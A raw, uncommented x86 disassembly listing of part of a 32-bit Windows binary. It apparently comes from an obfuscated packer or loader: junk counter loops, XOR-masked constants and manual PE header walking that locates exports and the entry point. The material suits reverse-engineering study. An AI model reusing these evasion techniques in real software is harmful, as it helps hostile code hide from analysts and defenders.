  405515:	mov    edx,DWORD PTR ds:0x4292b9
  40551b:	inc    edx
  40551c:	mov    DWORD PTR ds:0x4292b9,edx
  405522:	cmp    DWORD PTR ds:0x4292b9,0x19
  405529:	jae    0x4055c8
  40552f:	cmp    DWORD PTR ds:0x4292b9,0x8
  405536:	jne    0x40554a
  40553c:	push   0x4277cc
  405541:	push   DWORD PTR [ebp-0x28]
  405544:	call   DWORD PTR ds:0x427aa3
  40554a:	cmp    DWORD PTR ds:0x4292b9,0x7
  405551:	jne    0x405566
  405557:	xor    edx,edx
  405559:	xor    edx,DWORD PTR ds:0x4292b9
  40555f:	inc    edx
  405560:	mov    DWORD PTR ds:0x4292b9,edx
  405566:	jmp    0x405515
  40556b:	mov    DWORD PTR ds:0x42759c,0x10
  405575:	cmp    DWORD PTR ds:0x42759c,0x0
  40557c:	je     0x4055c8
  405582:	cmp    DWORD PTR ds:0x42759c,0x1f
  405589:	jne    0x4055b2
  40558f:	push   0x76d3
  405594:	push   DWORD PTR [ebp-0x10]
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x14]
  40559d:	push   0x4ba5
  4055a2:	push   0x42782a
  4055a7:	push   0x400000
  4055ac:	call   DWORD PTR ds:0x4278fb
  4055b2:	mov    eax,ds:0x42759c
  4055b7:	dec    eax
  4055b8:	mov    ds:0x42759c,eax
  4055bd:	jmp    0x405575
  4055c2:	xor    DWORD PTR ds:0x427d0b,edx
  4055c8:	mov    eax,DWORD PTR [ebp-0x18]
  4055cb:	mov    edx,DWORD PTR ds:0x4092b0
  4055d1:	mov    DWORD PTR ds:0x4275a8,0x6b2
  4055db:	xor    eax,esi
  4055dd:	add    eax,ebx
  4055df:	mov    DWORD PTR ds:0x4292d1,0x50ae
  4055e9:	cmp    edx,eax
  4055eb:	mov    DWORD PTR ds:0x4292d1,0x1218
  4055f5:	jne    0x405ffd
  4055fb:	and    DWORD PTR ds:0x427d17,0x0
  405605:	mov    eax,ds:0x427d17
  40560a:	inc    eax
  40560b:	mov    ds:0x427d17,eax
  405610:	cmp    DWORD PTR ds:0x427d17,0x7
  405617:	jne    0x40562d
  40561d:	push   0x4275e0
  405622:	push   0x400000
  405627:	call   DWORD PTR ds:0x427aa7
  40562d:	cmp    DWORD PTR ds:0x427d17,0x6
  405634:	jne    0x405645
  40563a:	mov    eax,ds:0x427d17
  40563f:	inc    eax
  405640:	mov    ds:0x427d17,eax
  405645:	cmp    DWORD PTR ds:0x427d17,0x15
  40564c:	jb     0x405605
  405652:	mov    eax,DWORD PTR [ebp-0x18]
  405655:	mov    DWORD PTR [ebp-0x30],eax
  405658:	and    DWORD PTR ds:0x4275ac,0x0
  405662:	jmp    0x405672
  405667:	mov    eax,ds:0x4275ac
  40566c:	inc    eax
  40566d:	mov    ds:0x4275ac,eax
  405672:	cmp    DWORD PTR ds:0x4275ac,0x12
  405679:	jae    0x40570b
  40567f:	cmp    DWORD PTR ds:0x4275ac,0x5
  405686:	jne    0x40569c
  40568c:	push   0x8a4f
  405691:	push   0x1ced
  405696:	call   DWORD PTR ds:0x427aab
  40569c:	cmp    DWORD PTR ds:0x4275ac,0x4
  4056a3:	jne    0x4056b7
  4056a9:	xor    eax,eax
  4056ab:	xor    eax,DWORD PTR ds:0x4275ac
  4056b1:	inc    eax
  4056b2:	mov    ds:0x4275ac,eax
  4056b7:	jmp    0x405667
  4056bc:	mov    DWORD PTR ds:0x4275a8,0x1a
  4056c6:	cmp    DWORD PTR ds:0x4275a8,0x0
  4056cd:	je     0x40570b
  4056d3:	cmp    DWORD PTR ds:0x4275a8,0x24
  4056da:	jne    0x4056f5
  4056e0:	push   0x8e07
  4056e5:	push   0x4292a5
  4056ea:	push   0x400000
  4056ef:	call   DWORD PTR ds:0x4279db
  4056f5:	mov    eax,ds:0x4275a8
  4056fa:	dec    eax
  4056fb:	mov    ds:0x4275a8,eax
  405700:	jmp    0x4056c6
  405705:	neg    DWORD PTR ds:0x42c89e
  40570b:	mov    eax,DWORD PTR [ebp-0x20]
  40570e:	add    edx,0x3568
  405714:	mov    DWORD PTR [ebp-0x1c],eax
  405717:	xor    eax,eax
  405719:	add    eax,DWORD PTR ds:0x4278bb
  40571f:	mov    edi,DWORD PTR ds:0x4278bf
  405725:	sub    eax,edi
  405727:	add    eax,DWORD PTR [eax+edi*1]
  40572a:	mov    eax,ds:0x4091a0
  40572f:	or     DWORD PTR ds:0x427d1f,ecx
  405735:	mov    eax,DWORD PTR [eax+0x198]
  40573b:	sub    edx,DWORD PTR ds:0x4292b5
  405741:	mov    DWORD PTR [ebp-0xc],eax
  405744:	mov    eax,DWORD PTR [ebp-0x1c]
  405747:	mov    edx,DWORD PTR [ebp-0xc]
  40574a:	or     DWORD PTR ds:0x427594,ebx
  405750:	xor    eax,esi
  405752:	sbb    edi,0x2806
  405758:	add    eax,ebx
  40575a:	xor    edi,0x222f
  405760:	mov    DWORD PTR [edx],eax
  405762:	and    DWORD PTR ds:0x42c89e,0x0
  40576c:	jmp    0x40577e
  405771:	mov    edx,DWORD PTR ds:0x42c89e
  405777:	inc    edx
  405778:	mov    DWORD PTR ds:0x42c89e,edx
  40577e:	cmp    DWORD PTR ds:0x42c89e,0x1b
  405785:	jae    0x4057c4
  40578b:	cmp    DWORD PTR ds:0x42c89e,0x4
  405792:	jne    0x4057a3
  405798:	push   0x755f
  40579d:	call   DWORD PTR ds:0x4279df
  4057a3:	cmp    DWORD PTR ds:0x42c89e,0x3
  4057aa:	jne    0x4057bf
  4057b0:	xor    edx,edx
  4057b2:	or     edx,DWORD PTR ds:0x42c89e
  4057b8:	inc    edx
  4057b9:	mov    DWORD PTR ds:0x42c89e,edx
  4057bf:	jmp    0x405771
  4057c4:	lea    eax,[ebp-0x14]
  4057c7:	mov    DWORD PTR [ebp-0x44],eax
  4057ca:	and    DWORD PTR ds:0x4275a4,0x0
  4057d4:	jmp    0x4057e6
  4057d9:	mov    edx,DWORD PTR ds:0x4275a4
  4057df:	inc    edx
  4057e0:	mov    DWORD PTR ds:0x4275a4,edx
  4057e6:	cmp    DWORD PTR ds:0x4275a4,0x1c
  4057ed:	jae    0x40582a
  4057f3:	cmp    DWORD PTR ds:0x4275a4,0x11
  4057fa:	jne    0x40580b
  405800:	push   0x864b
  405805:	call   DWORD PTR ds:0x4279e3
  40580b:	cmp    DWORD PTR ds:0x4275a4,0x10
  405812:	jne    0x405825
  405818:	mov    edx,DWORD PTR ds:0x4275a4
  40581e:	inc    edx
  40581f:	mov    DWORD PTR ds:0x4275a4,edx
  405825:	jmp    0x4057d9
  40582a:	mov    eax,DWORD PTR [ebp-0x1c]
  40582d:	mov    edx,DWORD PTR [ebp-0x44]
  405830:	xor    eax,esi
  405832:	or     DWORD PTR ds:0x4275a0,edx
  405838:	add    eax,ebx
  40583a:	adc    DWORD PTR ds:0x4275a4,0x37fa
  405844:	mov    DWORD PTR [edx],eax
  405846:	and    DWORD PTR ds:0x4292c9,edi
  40584c:	mov    DWORD PTR [ebp-0x54],ecx
  40584f:	lea    eax,[ebp-0x54]
  405852:	or     edi,edi
  405854:	mov    DWORD PTR [ebp-0x10],eax
  405857:	mov    edi,DWORD PTR ds:0x4292b1
  40585d:	or     edi,DWORD PTR ds:0x4275a8
  405863:	mov    DWORD PTR ds:0x4292b1,edi
  405869:	mov    eax,DWORD PTR [ebp-0x54]
  40586c:	mov    DWORD PTR ds:0x4292a1,0x1d
  405876:	cmp    DWORD PTR ds:0x4292a1,0x0
  40587d:	je     0x4058ca
  405883:	cmp    DWORD PTR ds:0x4292a1,0xb
  40588a:	jne    0x40589c
  405890:	push   DWORD PTR [ebp-0x24]
  405893:	push   DWORD PTR [ebp-0x14]
  405896:	call   DWORD PTR ds:0x427aaf
  40589c:	cmp    DWORD PTR ds:0x4292a1,0xc
  4058a3:	jne    0x4058b6
  4058a9:	mov    ecx,DWORD PTR ds:0x4292a1
  4058af:	dec    ecx
  4058b0:	mov    DWORD PTR ds:0x4292a1,ecx
  4058b6:	xor    ecx,ecx
  4058b8:	xor    ecx,DWORD PTR ds:0x4292a1
  4058be:	dec    ecx
  4058bf:	mov    DWORD PTR ds:0x4292a1,ecx
  4058c5:	jmp    0x405876
  4058ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4058cd:	or     DWORD PTR ds:0x427d0f,0x2cf9
  4058d7:	xor    eax,esi
  4058d9:	mov    edi,DWORD PTR ds:0x427d07
  4058df:	or     DWORD PTR ds:0x4292b9,edi
  4058e5:	add    eax,0x32729e
  4058ea:	mov    DWORD PTR [ecx],eax
  4058ec:	sub    edi,edi
  4058ee:	mov    eax,ds:0x409274
  4058f3:	sbb    DWORD PTR ds:0x42c882,0x4292dd
  4058fd:	mov    DWORD PTR [ebp-0x28],0x8e12febe
  405904:	sbb    DWORD PTR ds:0x427d0f,0x4292d5
  40590e:	mov    eax,DWORD PTR [eax]
  405910:	mov    cx,WORD PTR [ebp-0x14]
  405914:	movzx  edi,WORD PTR ds:0x4292dd
  40591b:	and    DWORD PTR ds:0x4292d9,edi
  405921:	movzx  ecx,cx
  405924:	add    DWORD PTR ds:0x4275b0,0x4292b5
  40592e:	add    ecx,DWORD PTR [eax]
  405930:	or     edi,edi
  405932:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  405939:	mov    DWORD PTR [ebp-0x10],ecx
  40593c:	sub    ecx,DWORD PTR ds:0x4292c1
  405942:	mov    edi,0x5a3fc9e
  405947:	mov    eax,DWORD PTR [ebp-0x1c]
  40594a:	mov    DWORD PTR ds:0x427d1b,0x10
  405954:	cmp    DWORD PTR ds:0x427d1b,0x0
  40595b:	je     0x4059b1
  405961:	cmp    DWORD PTR ds:0x427d1b,0x6
  405968:	jne    0x405983
  40596e:	push   0x1942
  405973:	push   0x427d03
  405978:	push   0x427644
  40597d:	call   DWORD PTR ds:0x427ab3
  405983:	cmp    DWORD PTR ds:0x427d1b,0x7
  40598a:	jne    0x40599f
  405990:	xor    ecx,ecx
  405992:	xor    ecx,DWORD PTR ds:0x427d1b
  405998:	dec    ecx
  405999:	mov    DWORD PTR ds:0x427d1b,ecx
  40599f:	mov    ecx,DWORD PTR ds:0x427d1b
  4059a5:	dec    ecx
  4059a6:	mov    DWORD PTR ds:0x427d1b,ecx
  4059ac:	jmp    0x405954
  4059b1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059b4:	xor    eax,esi
  4059b6:	or     DWORD PTR ds:0x4292cd,0x78e6
  4059c0:	add    eax,ebx
  4059c2:	mov    DWORD PTR ds:0x4292b1,0x5c9d
  4059cc:	cmp    DWORD PTR [ecx],eax
  4059ce:	jne    0x405c08
  4059d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4059d7:	xor    ecx,DWORD PTR ds:0x4292c1
  4059dd:	mov    ecx,DWORD PTR [ebp-0x10]
  4059e0:	xor    eax,esi
  4059e2:	add    eax,ebx
  4059e4:	mov    DWORD PTR ds:0x4275a4,0x5c09
  4059ee:	cmp    DWORD PTR [ecx],eax
  4059f0:	mov    DWORD PTR ds:0x4275b0,0x35e5
  4059fa:	jne    0x405ad7
  405a00:	mov    eax,DWORD PTR [ebp-0x1c]
  405a03:	mov    ecx,DWORD PTR [ebp-0x44]
  405a06:	xor    eax,esi
  405a08:	add    eax,ebx
  405a0a:	mov    DWORD PTR [ecx],eax
  405a0c:	and    DWORD PTR ds:0x42c886,0x0
  405a16:	jmp    0x405a28
  405a1b:	mov    edx,DWORD PTR ds:0x42c886
  405a21:	inc    edx
  405a22:	mov    DWORD PTR ds:0x42c886,edx
  405a28:	cmp    DWORD PTR ds:0x42c886,0x1e
  405a2f:	jae    0x405ab0
  405a35:	cmp    DWORD PTR ds:0x42c886,0x2b
  405a3c:	jne    0x405a4d
  405a42:	push   0x2523
  405a47:	call   DWORD PTR ds:0x427ab7
  405a4d:	jmp    0x405a1b
  405a52:	and    DWORD PTR ds:0x4292b5,0x0
  405a5c:	xor    edx,edx
  405a5e:	xor    edx,DWORD PTR ds:0x4292b5
  405a64:	inc    edx
  405a65:	mov    DWORD PTR ds:0x4292b5,edx
  405a6b:	cmp    DWORD PTR ds:0x4292b5,0xe
  405a72:	jne    0x405a83
  405a78:	push   0x3988
  405a7d:	call   DWORD PTR ds:0x4279e7
  405a83:	cmp    DWORD PTR ds:0x4292b5,0xd
  405a8a:	jne    0x405a9d
  405a90:	mov    edx,DWORD PTR ds:0x4292b5
  405a96:	inc    edx
  405a97:	mov    DWORD PTR ds:0x4292b5,edx
  405a9d:	cmp    DWORD PTR ds:0x4292b5,0x19
  405aa4:	jb     0x405a5c
  405aaa:	sbb    DWORD PTR ds:0x4292c9,ebx
  405ab0:	mov    eax,DWORD PTR [ebp-0x44]
  405ab3:	mov    ecx,DWORD PTR [ebp-0x34]
  405ab6:	xor    ecx,esi
  405ab8:	sub    edx,DWORD PTR ds:0x4292ad
  405abe:	mov    edx,0xffcd8d62
  405ac3:	sub    DWORD PTR ds:0x427cf7,0x427d0f
  405acd:	sub    edx,ecx
  405acf:	not    DWORD PTR ds:0x4292ad
  405ad5:	add    DWORD PTR [eax],edx
  405ad7:	and    DWORD PTR ds:0x4292ad,0x0
  405ae1:	mov    eax,ds:0x4292ad
  405ae6:	inc    eax
  405ae7:	mov    ds:0x4292ad,eax
  405aec:	cmp    DWORD PTR ds:0x4292ad,0x26
  405af3:	jne    0x405b19
  405af9:	push   DWORD PTR [ebp-0x28]
  405afc:	push   0x26cd
  405b01:	push   0x51bd
  405b06:	push   0x1327
  405b0b:	push   0x7353
  405b10:	push   DWORD PTR [ebp-0x1c]
  405b13:	call   DWORD PTR ds:0x4279eb
  405b19:	cmp    DWORD PTR ds:0x4292ad,0x16
  405b20:	jb     0x405ae1
  405b26:	mov    eax,ds:0x409274
  405b2b:	mov    eax,DWORD PTR [eax]
  405b2d:	mov    cx,WORD PTR [ebp-0x14]
  405b31:	movzx  ecx,cx
  405b34:	adc    DWORD PTR ds:0x4292a9,0x4292d1
  405b3e:	add    ecx,DWORD PTR [eax]
  405b40:	mov    DWORD PTR [ebp-0x10],ecx
  405b43:	mov    eax,ds:0x42c892
  405b48:	adc    DWORD PTR ds:0x42c89a,eax
  405b4e:	mov    eax,DWORD PTR [ebp-0x30]
  405b51:	sbb    ecx,DWORD PTR ds:0x4292b9
  405b57:	mov    ecx,DWORD PTR [ebp-0x30]
  405b5a:	or     DWORD PTR ds:0x42c88a,0x6b1f
  405b64:	xor    eax,esi
  405b66:	lea    eax,[eax+eax*1+0x32729e]
  405b6d:	adc    DWORD PTR ds:0x42759c,0x427d07
  405b77:	xor    ecx,esi
  405b79:	sub    ecx,eax
  405b7b:	mov    DWORD PTR ds:0x4275b0,0x4a7
  405b85:	mov    ax,WORD PTR [ebp-0x14]
  405b89:	mov    DWORD PTR ds:0x42c88e,0x21d5
  405b93:	movzx  eax,ax
  405b96:	mov    DWORD PTR ds:0x4292b9,0x441f
  405ba0:	cmp    eax,ecx
  405ba2:	mov    ecx,0x2c38
  405ba7:	mov    eax,DWORD PTR [ebp-0x34]
  405baa:	movzx  ecx,WORD PTR [ebp-0x14]
  405bae:	jg     0x405beb
  405bb4:	or     DWORD PTR ds:0x42c88e,0x6341
  405bbe:	xor    eax,esi
  405bc0:	sbb    DWORD PTR ds:0x427d13,0x4292bd
  405bca:	sub    ecx,eax
  405bcc:	sbb    DWORD PTR ds:0x4292a9,0x68
  405bd6:	sub    ecx,ebx
  405bd8:	mov    DWORD PTR ds:0x4292b5,0x7dde
  405be2:	mov    WORD PTR [ebp-0x14],cx
  405be6:	jmp    0x405c08
  405beb:	xor    eax,esi
  405bed:	mov    DWORD PTR ds:0x4292c1,0x28f0
  405bf7:	lea    eax,[eax+ecx*1+0x32729e]
  405bfe:	mov    DWORD PTR ds:0x4275a4,ecx
  405c04:	mov    WORD PTR [ebp-0x14],ax
  405c08:	mov    ecx,DWORD PTR [ebp-0x28]
  405c0b:	mov    eax,ds:0x427594
  405c10:	mov    eax,0x8e12febe
  405c15:	cmp    ecx,eax
  405c17:	je     0x405c41
  405c1d:	not    eax
  405c1f:	mov    eax,DWORD PTR [ebp-0xc]
  405c22:	mov    DWORD PTR ds:0x427598,0x90
  405c2c:	mov    DWORD PTR [eax],0x60341e8d
  405c32:	mov    DWORD PTR ds:0x427cfb,0xcef
  405c3c:	jmp    0x405fec
  405c41:	mov    DWORD PTR ds:0x427cfb,ecx
  405c47:	mov    ecx,DWORD PTR [ebp-0x28]
  405c4a:	mov    DWORD PTR ds:0x4275a8,0x60ce
  405c54:	cmp    ecx,0x5142ddbc
  405c5a:	mov    DWORD PTR ds:0x4292d5,0x22e7
  405c64:	jne    0x405dd1
  405c6a:	not    eax
  405c6c:	mov    eax,DWORD PTR [ebp-0xc]
  405c6f:	mov    DWORD PTR [eax],0x4214febc
  405c75:	mov    eax,DWORD PTR [ebp-0xc]
  405c78:	mov    DWORD PTR ds:0x42c89e,0x9bc
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	mov    eax,DWORD PTR [ebp-0x30]
  405c88:	mov    DWORD PTR ds:0x4292bd,ebx
  405c8e:	mov    eax,DWORD PTR [ebp-0x1c]
  405c91:	mov    eax,0x59e1
  405c96:	mov    DWORD PTR [ebp-0x4c],edi
  405c99:	mov    eax,DWORD PTR [ebp-0x4c]
  405c9c:	mov    DWORD PTR ds:0x4292d1,0x6603
  405ca6:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405cad:	mov    DWORD PTR ds:0x42c89e,0x4b8d
  405cb7:	cmp    eax,edi
  405cb9:	jne    0x405fec
  405cbf:	mov    ax,WORD PTR [ebp-0x8]
  405cc3:	and    DWORD PTR ds:0x4292c9,0x0
  405ccd:	mov    ecx,DWORD PTR ds:0x4292c9
  405cd3:	inc    ecx
  405cd4:	mov    DWORD PTR ds:0x4292c9,ecx
  405cda:	cmp    DWORD PTR ds:0x4292c9,0x7
  405ce1:	jne    0x405d0a
  405ce7:	push   0x3aec
  405cec:	push   0x6e2f
  405cf1:	push   0x3209
  405cf6:	push   0x4292c9
  405cfb:	push   DWORD PTR [ebp-0x20]
  405cfe:	push   DWORD PTR [ebp-0x28]
  405d01:	push   DWORD PTR [ebp-0x14]
  405d04:	call   DWORD PTR ds:0x427abb
  405d0a:	cmp    DWORD PTR ds:0x4292c9,0x6
  405d11:	jne    0x405d24
  405d17:	mov    ecx,DWORD PTR ds:0x4292c9
  405d1d:	inc    ecx
  405d1e:	mov    DWORD PTR ds:0x4292c9,ecx
  405d24:	cmp    DWORD PTR ds:0x4292c9,0x1a
  405d2b:	jb     0x405ccd
  405d31:	mov    ecx,0x8a42
  405d36:	and    DWORD PTR ds:0x427598,0x7f75
  405d40:	xor    ax,cx
  405d43:	mov    ecx,DWORD PTR ds:0x427594
  405d49:	xor    DWORD PTR ds:0x4292c9,ecx
  405d4f:	mov    ecx,0x3b08
  405d54:	add    ax,cx
  405d57:	mov    ecx,DWORD PTR [ebp-0x4]
  405d5a:	movzx  eax,ax
  405d5d:	sub    DWORD PTR ds:0x4292dd,0x42c892
  405d67:	not    eax
  405d69:	add    DWORD PTR ds:0x42c88a,0x427d03
  405d73:	and    eax,DWORD PTR [ecx]
  405d75:	mov    DWORD PTR ds:0x42c886,0x6891
  405d7f:	mov    ecx,DWORD PTR [ebp-0x4]
  405d82:	mov    DWORD PTR ds:0x4275ac,0x5963
  405d8c:	mov    DWORD PTR [ecx],eax
  405d8e:	jmp    0x405d9a
  405d93:	xor    DWORD PTR [ebp-0x4c],0xe149ebe
  405d9a:	xor    DWORD PTR ds:0x427d1b,0x1156
  405da4:	mov    ax,WORD PTR [ebp-0x8]
  405da8:	push   DWORD PTR [ebp-0x4]
  405dab:	call   0x401000
  405db0:	test   eax,eax
  405db2:	mov    DWORD PTR ds:0x4292d9,0x68ee
  405dbc:	je     0x405d93
  405dc2:	mov    DWORD PTR ds:0x4292b1,0x2e0e
  405dcc:	jmp    0x405fec
  405dd1:	mov    ecx,DWORD PTR [ebp-0x28]
  405dd4:	cmp    ecx,0x1443fcbd
  405dda:	mov    DWORD PTR ds:0x427598,0x1afd
  405de4:	jne    0x405e02
  405dea:	mov    eax,DWORD PTR [ebp-0xc]
  405ded:	mov    DWORD PTR ds:0x4292b9,0x35a9
  405df7:	mov    DWORD PTR [eax],0x60062d8f
  405dfd:	jmp    0x405fec
  405e02:	mov    ecx,DWORD PTR [ebp-0x28]
  405e05:	cmp    ecx,eax
  405e07:	mov    DWORD PTR ds:0x42c88a,0x2673
  405e11:	jne    0x405f71
  405e17:	and    DWORD PTR ds:0x427cff,0x0
  405e21:	xor    eax,eax
  405e23:	or     eax,DWORD PTR ds:0x427cff
  405e29:	inc    eax
  405e2a:	mov    ds:0x427cff,eax
  405e2f:	cmp    DWORD PTR ds:0x427cff,0xc
  405e36:	jne    0x405e47
  405e3c:	push   0x4d1d
  405e41:	call   DWORD PTR ds:0x427abf
  405e47:	cmp    DWORD PTR ds:0x427cff,0xb
  405e4e:	jne    0x405e62
  405e54:	xor    eax,eax
  405e56:	or     eax,DWORD PTR ds:0x427cff
  405e5c:	inc    eax
  405e5d:	mov    ds:0x427cff,eax
  405e62:	cmp    DWORD PTR ds:0x427cff,0x1f
  405e69:	jb     0x405e21
  405e6f:	mov    eax,DWORD PTR [ebp-0x1c]
  405e72:	mov    ecx,DWORD PTR [ebp-0xc]
  405e75:	xor    eax,esi
  405e77:	add    eax,ebx
  405e79:	cmp    DWORD PTR [ecx],eax
  405e7b:	je     0x405efe
  405e81:	mov    ecx,DWORD PTR [ebp-0x54]
  405e84:	mov    eax,DWORD PTR [ebp-0xc]
  405e87:	mov    eax,DWORD PTR [eax]
  405e89:	mov    eax,DWORD PTR [eax+0x3c]
  405e8c:	lea    ecx,[ecx*8+0x78]
  405e93:	add    eax,ecx
  405e95:	mov    ecx,DWORD PTR [ebp-0xc]
  405e98:	mov    ecx,DWORD PTR [ecx]
  405e9a:	mov    eax,DWORD PTR [eax+ecx*1]
  405e9d:	mov    DWORD PTR [ebp-0x8],eax
  405ea0:	mov    eax,DWORD PTR [ebp-0x1c]
  405ea3:	xor    eax,esi
  405ea5:	add    eax,ebx
  405ea7:	mov    DWORD PTR [ebp-0x4],eax
  405eaa:	mov    eax,DWORD PTR [ebp-0x1c]
  405ead:	mov    ecx,DWORD PTR [ebp-0x8]
  405eb0:	xor    eax,esi
  405eb2:	add    eax,ebx
  405eb4:	cmp    ecx,eax
  405eb6:	je     0x405fec
  405ebc:	mov    eax,DWORD PTR [ebp-0xc]
  405ebf:	mov    ecx,DWORD PTR [ebp-0x8]
  405ec2:	add    ecx,DWORD PTR [eax]
  405ec4:	mov    DWORD PTR [ebp-0x4],ecx
  405ec7:	mov    eax,DWORD PTR [ebp-0x4]
  405eca:	mov    ecx,DWORD PTR [ebp-0xc]
  405ecd:	mov    eax,DWORD PTR [eax+0xc]
  405ed0:	mov    ecx,DWORD PTR [ecx]
  405ed2:	mov    al,BYTE PTR [eax+ecx*1]
  405ed5:	add    al,0x35
  405ed7:	xor    al,0x49
  405ed9:	cmp    al,0xc9
  405edb:	je     0x405ef2
  405ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  405ee4:	mov    ecx,DWORD PTR [ebp-0xc]
  405ee7:	xor    eax,esi
  405ee9:	add    eax,ebx
  405eeb:	mov    DWORD PTR [ecx],eax
  405eed:	jmp    0x405fec
  405ef2:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  405ef9:	jmp    0x405fec
  405efe:	mov    eax,DWORD PTR [ebp-0xc]
  405f01:	mov    ecx,DWORD PTR [ebp-0x10]
  405f04:	mov    ecx,DWORD PTR [ecx]
  405f06:	mov    DWORD PTR [eax],ecx
  405f08:	mov    eax,DWORD PTR [ebp-0xc]
  405f0b:	mov    DWORD PTR [ebp-0x4],eax
  405f0e:	mov    eax,DWORD PTR [ebp-0x30]
  405f11:	mov    eax,DWORD PTR [ebp-0x1c]
  405f14:	mov    DWORD PTR [ebp-0x5c],edi
  405f17:	mov    eax,DWORD PTR [ebp-0x5c]
  405f1a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405f21:	cmp    eax,edi
  405f23:	jne    0x405fec
  405f29:	mov    ax,WORD PTR [ebp-0x8]
  405f2d:	mov    ecx,0x8a42
  405f32:	xor    ax,cx
  405f35:	mov    ecx,0x3b08
  405f3a:	add    ax,cx
  405f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405f40:	movzx  eax,ax
  405f43:	not    eax
  405f45:	and    eax,DWORD PTR [ecx]
  405f47:	mov    ecx,DWORD PTR [ebp-0x4]
  405f4a:	mov    DWORD PTR [ecx],eax
  405f4c:	jmp    0x405f58
  405f51:	xor    DWORD PTR [ebp-0x5c],0xe149ebe
  405f58:	mov    ax,WORD PTR [ebp-0x8]
  405f5c:	push   DWORD PTR [ebp-0x4]
  405f5f:	call   0x401000
  405f64:	test   eax,eax
  405f66:	je     0x405f51
  405f6c:	jmp    0x405fec
  405f71:	mov    eax,DWORD PTR [ebp-0x28]
  405f74:	cmp    eax,0x33450cad
  405f79:	jne    0x405fec
  405f7f:	mov    eax,DWORD PTR [ebp-0xc]
  405f82:	mov    DWORD PTR [eax],0x443dc9d
  405f88:	mov    eax,DWORD PTR [ebp-0xc]
  405f8b:	mov    DWORD PTR [ebp-0x4],eax
  405f8e:	mov    eax,DWORD PTR [ebp-0x30]
  405f91:	mov    eax,DWORD PTR [ebp-0x1c]
  405f94:	mov    DWORD PTR [ebp-0x40],edi
  405f97:	mov    eax,DWORD PTR [ebp-0x40]
  405f9a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405fa1:	cmp    eax,edi
  405fa3:	jne    0x405fec
  405fa9:	mov    ax,WORD PTR [ebp-0x8]
  405fad:	mov    ecx,0x8a42
  405fb2:	xor    ax,cx
  405fb5:	mov    ecx,0x3b08
  405fba:	add    ax,cx
  405fbd:	mov    ecx,DWORD PTR [ebp-0x4]
  405fc0:	movzx  eax,ax
  405fc3:	not    eax
  405fc5:	and    eax,DWORD PTR [ecx]
  405fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  405fca:	mov    DWORD PTR [ecx],eax
  405fcc:	jmp    0x405fd8
  405fd1:	xor    DWORD PTR [ebp-0x40],0xe149ebe
  405fd8:	mov    ax,WORD PTR [ebp-0x8]
  405fdc:	push   DWORD PTR [ebp-0x4]
  405fdf:	call   0x401000
  405fe4:	test   eax,eax
  405fe6:	je     0x405fd1
  405fec:	mov    eax,DWORD PTR [ebp-0x28]
  405fef:	cmp    eax,0x8e12febe
  405ff4:	je     0x405947
  405ffa:	mov    eax,DWORD PTR [ebp-0xc]
  405ffd:	mov    eax,ds:0x4091a0
  406002:	mov    eax,DWORD PTR [eax+0x18c]
  406008:	mov    eax,DWORD PTR [eax]
  40600a:	mov    DWORD PTR [ebp-0x74],eax
  40600d:	mov    eax,0xf89c8531
  406012:	mov    DWORD PTR [ebp-0x10],eax
  406015:	mov    DWORD PTR [ebp-0x10],eax
  406018:	mov    DWORD PTR [ebp-0x10],eax
  40601b:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  406022:	mov    DWORD PTR [ebp-0x8],eax
  406025:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  40602c:	mov    edi,DWORD PTR [ebp-0x20]
  40602f:	xor    edi,esi
  406031:	add    edi,ebx
  406033:	jmp    0x40606e
  406038:	mov    eax,DWORD PTR [ebp-0x18]
  40603b:	xor    eax,esi
  40603d:	lea    eax,[eax+edi*1+0x32729e]
  406044:	push   eax
  406045:	mov    eax,DWORD PTR [ebp-0x10]
  406048:	xor    eax,esi
  40604a:	lea    eax,[ebp+eax*1+0x3272a6]
  406051:	push   eax
  406052:	mov    eax,ds:0x4091a0
  406057:	push   DWORD PTR [eax+0x1bc]
  40605d:	call   0x402c87
  406062:	mov    eax,DWORD PTR [ebp-0x18]
  406065:	xor    eax,esi
  406067:	lea    edi,[edi+eax*1+0x32729e]
  40606e:	mov    eax,DWORD PTR [ebp-0x18]
  406071:	mov    ecx,DWORD PTR [ebp-0x18]
  406074:	xor    ecx,esi
  406076:	xor    eax,esi
  406078:	add    eax,ecx
  40607a:	mov    ecx,DWORD PTR [ebp-0x18]
  40607d:	xor    ecx,esi
  40607f:	lea    eax,[eax+ecx*1+0x9757da]
  406086:	cmp    edi,eax
  406088:	jbe    0x406038
  40608e:	mov    eax,DWORD PTR [ebp+0xc]
  406091:	mov    ds:0x409024,eax
  406096:	mov    eax,DWORD PTR [ebp+0x10]
  406099:	mov    ds:0x409278,eax
  40609e:	mov    eax,ds:0x409024
  4060a3:	mov    ecx,DWORD PTR [ebp-0x60]
  4060a6:	sub    eax,ebx
  4060a8:	xor    eax,esi
  4060aa:	mov    DWORD PTR [ecx],eax
  4060ac:	mov    eax,DWORD PTR [ebp-0x58]
  4060af:	cmp    eax,0xf89c8534
  4060b4:	je     0x406111
  4060ba:	mov    eax,DWORD PTR [ebp-0x20]
  4060bd:	mov    ecx,DWORD PTR [ebp-0x50]
  4060c0:	xor    eax,esi
  4060c2:	add    eax,ebx
  4060c4:	cmp    eax,ecx
  4060c6:	je     0x406111
  4060cc:	mov    eax,ds:0x4091a0
  4060d1:	mov    eax,DWORD PTR [eax+0x194]
  4060d7:	mov    ecx,DWORD PTR [eax]
  4060d9:	mov    eax,DWORD PTR [ecx+0x3c]
  4060dc:	push   DWORD PTR ds:0x409278
  4060e2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4060e6:	push   DWORD PTR ds:0x409024
  4060ec:	add    eax,ecx
  4060ee:	mov    ecx,DWORD PTR ds:0x4091a0
  4060f4:	mov    ecx,DWORD PTR [ecx+0x194]
  4060fa:	push   DWORD PTR [ecx]
